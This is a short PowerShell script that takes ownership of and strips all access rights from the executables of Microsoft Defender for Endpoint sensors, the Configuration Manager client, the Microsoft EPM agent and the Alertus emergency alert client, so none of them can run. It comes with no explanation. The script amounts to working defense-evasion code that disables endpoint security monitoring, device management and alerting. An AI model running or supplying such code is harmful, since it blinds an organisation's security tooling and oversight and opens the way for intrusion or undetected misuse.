# Define the array of executable file paths
$exePaths = @(
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseTracer.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseAP.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseAPZ.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\Classification\SenseCE.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseDlpProcessor.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseIR.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseNdr.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseTracer.exe",
    "C:\Program Files\Windows Defender Advanced Threat Protection\SenseTVM.exe",
    "C:\Program Files (x86)\Alertus Technologies\Alertus Desktop\AlertusDesktopAlert.exe",
    "C:\Windows\ccmsetup\ccmsetup.exe",
    "C:\Program Files\Microsoft EPM Agent\EPMService\EpmService.exe",
    "C:\Windows\CCM\CcmExec.exe",
    "C:\Windows\CCM\SCNotification.exe"
)

# Iterate over each path
foreach ($path in $exePaths) {
    Write-Host "Processing $path..." -NoNewline
    if (Test-Path $path) {
        try {
            # Take ownership
            $owner = "Administrators"
            $acl = Get-Acl $path
            $acl.SetOwner([System.Security.Principal.NTAccount]$owner)
            Set-Acl -Path $path -AclObject $acl

            # Create a completely empty ACL
            $emptyAcl = New-Object System.Security.AccessControl.FileSecurity
            $emptyAcl.SetOwner([System.Security.Principal.NTAccount]$owner)
            $emptyAcl.SetAccessRuleProtection($true, $false)  # Disable inheritance, don't preserve existing rules
            
            # Apply the empty ACL (no access rules added)
            Set-Acl -Path $path -AclObject $emptyAcl

            Write-Host " Done"
        }
        catch {
            Write-Host ""  # Move to new line for warning
            Write-Warning "Error processing ${path}: $($_.Exception.Message)"
        }
    } else {
        Write-Host " file not found."
    }
}